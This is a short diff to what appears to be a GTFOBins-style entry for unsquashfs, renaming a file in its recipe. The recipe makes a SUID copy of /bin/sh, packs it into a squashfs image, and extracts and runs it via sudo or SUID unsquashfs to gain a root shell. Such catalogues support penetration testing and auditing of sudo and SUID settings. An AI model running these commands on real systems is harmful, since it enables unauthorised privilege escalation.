@@ -5,17 +5,17 @@ description: |
   ```
   cp /bin/sh .
   chmod +s sh
-  mksquashfs sh shell.sqfs
+  mksquashfs sh x.sqfs
   ```
 
   Extract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).
 functions:
   sudo:
     - code: |
-        sudo unsquashfs ./shell.sqfs
+        sudo unsquashfs ./x.sqfs
         ./squashfs-root/sh -p
   suid:
     - code: |
-        unsquashfs -d $TF ./x.sqfs
+        unsquashfs ./x.sqfs
         ./squashfs-root/sh -p
 ---
